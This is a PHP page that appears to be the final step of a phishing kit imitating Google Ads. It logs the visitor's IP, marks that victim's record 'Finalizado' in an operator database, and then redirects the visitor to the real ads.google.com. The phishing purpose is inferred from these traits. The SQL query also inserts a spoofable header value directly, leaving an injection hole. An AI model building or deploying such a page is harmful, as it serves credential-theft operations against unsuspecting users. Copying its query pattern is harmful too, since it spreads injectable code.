<?php
session_start();
error_reporting(0);
//Incluindo a conexão com banco de dados
require_once "../cod3rconfig/registro.php";
require_once "../cod3rconfig/conexao.php";
require_once "../cod3rconfig/data.php";
  
 // DEFINE O FUSO HORARIO COMO O HORARIO DE BRASILIA
    date_default_timezone_set('America/Sao_Paulo');   


   $ip = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);



$dataLocal = date('d/m/Y H:i:s', time());

$tempo = time();
$atualiza = mysqli_query(DBCOnnect(), "UPDATE infos SET tempo='$tempo',  status='Finalizado', statusremote='Finalizado' WHERE ip='$ip'");


?>
<!DOCTYPE html>
<html lang="pt-BR"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<body>	
<script language="javascript">
setTimeout(function () {
    window.location = "https://ads.google.com/";
}, 10);
</script>


</body></html>